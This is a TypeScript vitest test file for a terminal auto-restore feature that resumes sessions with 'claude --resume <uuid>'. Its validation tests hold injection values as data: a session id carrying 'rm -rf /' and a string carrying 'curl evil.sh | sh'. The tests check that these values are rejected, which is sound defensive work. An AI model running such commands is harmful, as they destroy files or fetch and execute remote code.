import { describe, it, expect } from 'vitest';
import {
    selectAutoRestore,
    resolveAutoRestoreConfig,
    autoRestoreSummary,
    autoResumeCommand,
    markAutoRestored,
    AUTO_RESTORE_DEFAULTS,
    AUTO_RESTORE_HARD_MAX,
    type AutoRestoreCandidate,
} from './autoRestore';

const NOW = 1_800_000_000_000;
const H = 60 * 60 * 1000;
const UUID = 'c0c26854-5e0c-4063-aaeb-d4428fe8ed94';
const UUID2 = '11111111-2222-3333-4444-555555555555';

function cand(over: Partial<AutoRestoreCandidate> & { id: string }): AutoRestoreCandidate {
    return { seenAt: NOW - H, cwd: '/work', claudeSessionId: UUID, ...over };
}

const base = {
    now: NOW,
    config: AUTO_RESTORE_DEFAULTS,
    liveIds: new Set<string>(),
    cwdExists: () => true,
};

describe('resolveAutoRestoreConfig', () => {
    it('defaults to on with a conservative cap', () => {
        expect(resolveAutoRestoreConfig(undefined)).toEqual(AUTO_RESTORE_DEFAULTS);
        expect(resolveAutoRestoreConfig({}).max).toBe(6);
        expect(resolveAutoRestoreConfig({}).windowMs).toBe(24 * H);
    });

    it('honours explicit values and 0 (= off via cap)', () => {
        const c = resolveAutoRestoreConfig({
            terminalAutoRestore: true, terminalAutoRestoreMax: 3, terminalAutoRestoreWindowHours: 6,
        });
        expect(c).toEqual({ enabled: true, max: 3, windowMs: 6 * H });
        expect(resolveAutoRestoreConfig({ terminalAutoRestoreMax: 0 }).max).toBe(0);
        expect(resolveAutoRestoreConfig({ terminalAutoRestore: false }).enabled).toBe(false);
    });

    it('clamps an absurd cap and ignores junk instead of disabling itself', () => {
        expect(resolveAutoRestoreConfig({ terminalAutoRestoreMax: 200 }).max).toBe(AUTO_RESTORE_HARD_MAX);
        expect(resolveAutoRestoreConfig({ terminalAutoRestoreMax: 'six' }).max).toBe(6);
        expect(resolveAutoRestoreConfig({ terminalAutoRestoreWindowHours: -1 }).windowMs).toBe(24 * H);
        expect(resolveAutoRestoreConfig({ terminalAutoRestore: 'yes' }).enabled).toBe(true);
    });
});

describe('selectAutoRestore', () => {
    it('B-287: carries candidate pane geometry into the plan, omitting it when unknown', () => {
        const sel = selectAutoRestore([
            cand({ id: 'sized', seenAt: NOW - 1000, cols: 200, rows: 50 }),
            cand({ id: 'bare', seenAt: NOW - 2000 }),
        ], base);
        expect(sel.plans.find((p) => p.terminalId === 'sized')).toMatchObject({ cols: 200, rows: 50 });
        const bare = sel.plans.find((p) => p.terminalId === 'bare')!;
        expect('cols' in bare).toBe(false);
    });
    it('restores newest-first and builds the resume command', () => {
        const sel = selectAutoRestore([
            cand({ id: 'old', seenAt: NOW - 3 * H }),
            cand({ id: 'new', seenAt: NOW - 1000, claudeSessionId: UUID2, title: 'llm-hub' }),
        ], base);
        expect(sel.plans.map((p) => p.terminalId)).toEqual(['new', 'old']);
        expect(sel.plans[0]).toEqual({
            terminalId: 'new', cwd: '/work', title: 'llm-hub',
            claudeSessionId: UUID2, command: `claude --resume ${UUID2}`,
        });
        expect(sel.skipped).toEqual([]);
    });

    it('never touches a terminal that is alive (idempotent across restarts)', () => {
        const sel = selectAutoRestore([cand({ id: 'alive' })], { ...base, liveIds: new Set(['alive']) });
        expect(sel.plans).toEqual([]);
        expect(sel.skipped).toEqual([{ id: 'alive', reason: 'still-live' }]);
    });

    it('drops anything outside the recency window (a reboot also cleans up)', () => {
        const sel = selectAutoRestore([cand({ id: 'zombie', seenAt: NOW - 30 * H })], base);
        expect(sel.plans).toEqual([]);
        expect(sel.skipped).toEqual([{ id: 'zombie', reason: 'stale' }]);
    });

    it('never substitutes another directory when the cwd is gone', () => {
        const sel = selectAutoRestore(
            [cand({ id: 'moved', cwd: '/deleted' }), cand({ id: 'nocwd', cwd: undefined })],
            { ...base, cwdExists: (p) => p === '/work' },
        );
        expect(sel.plans).toEqual([]);
        expect(sel.skipped.map((s) => s.reason)).toEqual(['missing-cwd', 'missing-cwd']);
    });

    it('skips bare shells and malformed session ids', () => {
        const sel = selectAutoRestore([
            cand({ id: 'shell', claudeSessionId: undefined }),
            cand({ id: 'junk', claudeSessionId: 'c0c26854; rm -rf /' }),
        ], base);
        expect(sel.plans).toEqual([]);
        expect(sel.skipped.map((s) => s.reason)).toEqual(['no-conversation', 'no-conversation']);
    });

    it('caps AFTER the other filters, so a bad entry cannot eat a good slot', () => {
        const sel = selectAutoRestore([
            cand({ id: 'stale', seenAt: NOW - 40 * H }),      // filtered before the cap
            cand({ id: 'a', seenAt: NOW - 1 }),
            cand({ id: 'b', seenAt: NOW - 2 }),
            cand({ id: 'c', seenAt: NOW - 3 }),
        ], { ...base, config: { ...AUTO_RESTORE_DEFAULTS, max: 2 } });
        expect(sel.plans.map((p) => p.terminalId)).toEqual(['a', 'b']);
        expect(sel.skipped).toEqual([
            { id: 'c', reason: 'over-limit' },
            { id: 'stale', reason: 'stale' },
        ]);
    });

    it('is fully off when disabled or capped at 0', () => {
        for (const config of [
            { ...AUTO_RESTORE_DEFAULTS, enabled: false },
            { ...AUTO_RESTORE_DEFAULTS, max: 0 },
        ]) {
            const sel = selectAutoRestore([cand({ id: 'x' })], { ...base, config });
            expect(sel.plans).toEqual([]);
            expect(sel.skipped).toEqual([{ id: 'x', reason: 'disabled' }]);
        }
    });
});

describe('autoResumeCommand', () => {
    it('refuses anything that is not a uuid (this string is executed)', () => {
        expect(autoResumeCommand(UUID)).toBe(`claude --resume ${UUID}`);
        expect(() => autoResumeCommand('nope')).toThrow();
        expect(() => autoResumeCommand(`${UUID} && curl evil.sh | sh`)).toThrow();
    });
});

describe('markAutoRestored', () => {
    it('survives a transient empty probe and overlays the next good list', () => {
        const marks = new Map([['restored', NOW]]);

        expect(markAutoRestored([], marks)).toEqual([]);
        expect(marks.get('restored')).toBe(NOW);
        expect(markAutoRestored([
            { id: 'restored', title: 'workspace' },
            { id: 'ordinary', title: 'shell' },
        ], marks)).toEqual([
            { id: 'restored', title: 'workspace', restoredAt: NOW },
            { id: 'ordinary', title: 'shell' },
        ]);
    });
});

describe('autoRestoreSummary', () => {
    it('stays silent when nothing was restored and nothing was lost', () => {
        expect(autoRestoreSummary({ plans: [], skipped: [] })).toBeNull();
        expect(autoRestoreSummary({
            plans: [], skipped: [{ id: 'a', reason: 'still-live' }, { id: 'b', reason: 'disabled' }],
        })).toBeNull();
    });

    it('names what was NOT restored — a silent cap reads as "all restored"', () => {
        const line = autoRestoreSummary({
            plans: [{ terminalId: 'a', cwd: '/w', claudeSessionId: UUID, command: 'x' }],
            skipped: [
                { id: 'b', reason: 'over-limit' },
                { id: 'c', reason: 'over-limit' },
                { id: 'd', reason: 'missing-cwd' },
                { id: 'e', reason: 'still-live' },
            ],
        });
        expect(line).toBe('Restored 1 terminal, skipped 3 (2 over limit, 1 directory gone)');
    });

    it('reports a clean full restore without a skip clause', () => {
        expect(autoRestoreSummary({
            plans: [
                { terminalId: 'a', cwd: '/w', claudeSessionId: UUID, command: 'x' },
                { terminalId: 'b', cwd: '/w', claudeSessionId: UUID, command: 'x' },
            ],
            skipped: [],
        })).toBe('Restored 2 terminals');
    });
});
